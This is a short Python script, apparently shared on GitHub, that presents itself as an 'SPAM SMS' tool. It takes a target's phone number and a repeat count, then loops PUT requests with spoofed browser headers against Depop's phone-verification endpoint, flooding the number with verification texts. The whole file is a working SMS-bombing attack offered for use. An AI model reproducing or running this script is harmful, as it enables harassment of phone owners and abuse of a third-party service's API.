import os, json, requests, pyfiglet

os.system("clear")

word = pyfiglet.figlet_format("SPAM  SMS")
print (word)
print ('=====================================')
print ('[ο] Creator: Lukas Surya Tanuwijaya')
print ('[ο] Github : LkzPreacher')
print ()
print ("""Countries Code Lists:
	1. Indonesia (ID)
	2. Coming Soon!
""")

country = input('[×] Enter the Country Code (Ex: ID): ')
number = input('[×] Enter the Phone Number (Ex: 8xxxx): ')
count = input('[×] Enter the Spam Counts: ')

headers = {
        "Host" : "webapi.depop.com",
        "content-length" : "51",
        "accept" : "application/json, text/plain, */*",
        "user-agent" : "Mozilla/5.0 (Linux; Android 5.1; A33w Build/LMY47I; wv) AppleWe>",
        "content-type" : "application/json",
        "origin" : "https://signup.depop.com",
        "x-requested-with" : "mark.via.gp",
        "sec-fetch-site" : "same-site",
        "sec-fetch-mode" : "cors",
        "sec-fetch-dest" : "empty",
        "referer" : "https://signup.depop.com/",
        "accept-encoding" : "gzip, deflate",
        "accept-language" : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
}

data = {
        "phone_number":number,
        "country_code":country
}

for i in range(int(count)):
        respond = requests.put("https://webapi.depop.com/api/v1/auth/verify/phone", headers = headers, json = data)
        req = json.loads(respond.text)
        if req["is_verified"] == False:
                print ("÷> Spam Successful")
        else:
                print ("÷> Spam Failed")
